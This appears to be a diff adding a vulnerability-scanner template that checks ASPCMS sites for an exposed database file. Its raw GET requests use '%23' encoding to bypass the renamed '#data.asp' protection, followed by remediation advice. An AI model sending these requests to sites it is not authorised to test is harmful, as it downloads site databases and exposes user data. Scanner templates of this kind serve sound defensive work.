@@ -1,0 +1,42 @@
+id: AspCms_OEM-info
+info:
+  name: aspcms AspCms_OEM.asp逻辑漏洞暴露登陆地址
+  author:
+  - jim2g
+  description: |-
+    ASPCMS信息泄漏漏洞
+    ASPCMS最新版2.5.2以及ASPCMS2.3.x都存在这个问题，应该是通杀 在ASPCMS2.3.x中，ASPCMS的数据库在/data/目录下，为了防止数据库被下载，把数据库文件data.mdb重新命名为#data.asp，由于设置不当，使用%23编码#即可绕过访问，导致信息泄漏： http://127.0.0.1/data/%23data.asp 在最新版的2.5.2中，把数据库文件aspcms252.mdb重新命名为#aspcms252.asp，由于配置不当，使用%23编码#即可绕过访问，导致信息泄漏： http://127.0.0.1/data/%23aspcms252.asp 此问题通杀所有版本。
+  severity: high
+  remediation: |
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+
+    临时修复方案：
+    1、去除页面、cookie或缓存中涉及的敏感信息或删除泄露信息页面
+    2、将敏感信息进行加密存储，非必要不可发送前端
+    3、发送敏感信息时需加密传输，如有必要需脱敏处理
+    4、禁止用自己开发的加密算法，必须使用公开、安全的标准加密算法。
+    5、禁止在日志中记录明文的敏感数据：禁止在日志中记录明文的敏感数据（如口
+    令、会话标识jsessionid等）， 防止敏感信息泄漏。
+    6、禁止带有敏感数据的Web页面缓存：带有敏感数据的Web页面都应该禁止缓
+    存，以防止敏感信息泄漏或通过代理服务器上网的用户数据互窜问题。
+    7、对必须发送的敏感数据或页面请求接口做好严格的权限认证
+requests:
+- matchers:
+  - type: dsl
+    condition: or
+    dsl:
+    - status_code==200
+    - status_code==500
+  - type: dsl
+    condition: and
+    dsl:
+    - contains(body,'Standard Jet DB')
+  raw:
+  - |
+    GET /data/%23aspcms252.asp HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /data/%23data.asp HTTP/1.1
+    Host: {{Hostname}}
+  req-condition: true
